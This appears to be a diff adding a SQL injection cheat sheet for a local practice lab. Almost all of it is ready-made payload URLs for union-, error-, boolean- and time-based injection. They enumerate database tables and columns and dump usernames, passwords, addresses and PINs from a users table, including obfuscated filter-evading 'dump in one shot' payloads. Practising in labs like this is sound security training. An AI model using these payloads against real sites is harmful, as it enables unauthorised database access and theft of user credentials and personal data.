@@ -1,0 +1,46 @@
+Union based
+#############
+1)Put a '
+2)Check if the app responds to sql commands
+http://localhost/sql_lab/union_based/detail.php?id=3+and+0 -> Error
+http://localhost/sql_lab/union_based/detail.php?id=3+and+1 -> No error
+3) FInding the number of columns in initial select statement
+http://localhost/sql_lab/union_based/detail.php?id=3+order+by+4
+4)Finding version
+http://localhost/sql_lab/union_based/detail.php?id=3+and+0+union+select+1,2,version(),4
+5)To get table names
+http://localhost/sql_lab/union_based/detail.php?id=3+and+0+union+select+1,2,group_concat(table_name),4+from+information_schema.tables+where+table_schema=database()
+6) To get columns
+http://localhost/sql_lab/union_based/detail.php?id=3+and+0+union+select+1,2,group_concat(column_name),4+from+information_schema.columns+where+table_schema=database() and table_name= 'users'
+7) To dump data
+http://localhost/sql_lab/union_based/detail.php?id=3+and+0+union+select+1,2,group_concat(username,password,address,pin),4+from+users
+
+DIOS
+####
+To get table and column
+
+http://localhost/sql_lab/union_based/detail.php?id=3+and+0+union+select+1,2,(select(@x)from(select(@x:=0x00),(@running_number:=0),(@tbl:=0x00),(select(0)from(/*!information_schema*/.columns)where(table_schema=database())and(0x00)in(@x:=Concat/**/(@x,0x3c62723e,if( (@tbl!=table_name), Concat/**/(0x3c2f6469763e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c666f6e7420636f6c6f723d7265643e,0x3c666f6e742073697a653d333e,@tbl:=table_name,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e3e,0x3c666f6e742073697a653d323e,(@z:=0x00),0x3c646976207374796c653d226d617267696e2d6c6566743a333070783b223e ), 0x00),lpad(@z:=@z%2b1,2,0x30) , 0x2e ,column_name))))x),4
+
+To dump data
+http://localhost/sql_lab/union_based/detail.php?id=3+and+0+union+select+1,2,(select(@x)from(select(@x:=0x00),(select(@x)from(users)/*!50000where*/(@x)in(@x:=/*!50000concat*/(@x,0x0a,/*!50000IFNULL*/(username,0x656d707479),0x3a3a3a,/*!50000IFNULL*/(password,0x656d707479),0x3a3a3a,/*!50000IFNULL*/(address,0x656d707479),0x3a3a3a,0x3c62723e))))a),4
+
+
+Error based
+###########
+1)To get version
+http://localhost/sql_lab/error_based/detail.php?id=1 and extractvalue('',concat(">",version()))
+2) To get tables
+http://localhost/sql_lab/error_based/detail.php?id=1 and extractvalue('',concat(0x0a,(select table_name +from+information_schema.tables+where+table_schema=database() limit 0,1)))
+3) To get columns
+http://localhost/sql_lab/error_based/detail.php?id=1 and extractvalue('',concat(0x0a,(select column_name +from+information_schema.columns+where+table_schema=database() and table_name= 'users' limit 0,1)))
+4)Dump data
+http://localhost/sql_lab/error_based/detail.php?id=1 and extractvalue(0x0a,concat(0x0a,(select username+from+users limit 0,1)))
+
+
+Boolean based
+##############
+http://localhost/sql_lab/boolean_based/detail.php?id=1+and+Ascii(substring(version(),1,1))=49
+
+Time based
+###########
+http://localhost/sql_lab/time_based/detail.php?id=1+and+if(Ascii(substring(version(),1,1))=49,Sleep(4),0)
